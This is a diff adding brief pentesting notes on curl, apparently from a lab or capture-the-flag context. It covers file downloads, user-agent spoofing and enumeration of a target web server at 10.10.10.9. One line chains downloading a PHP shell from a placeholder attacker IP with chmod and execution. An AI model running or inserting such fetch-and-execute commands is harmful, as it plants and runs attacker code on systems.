@@ -1,1 +1,22 @@
+# cURL
+curl http://<ip>/file_name --output file_name
+
+change user agent
+curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" 
+
+curl -o <filename> http://192.168.x.x/malicious-things.php
+
+you can also pipe in commands too such as
+curl -o <filename> http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php
+
+User agent change
+curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" 
+
+root@kali# curl -s http://10.10.10.9/CHANGELOG.txt | head
+
+I’ll see the /rest is a valid path. When I check it out, it gives me the endpoint:
+root@kali# curl http://10.10.10.9/rest
+Services Endpoint "rest_endpoint" has been setup successfully.
+
+
 
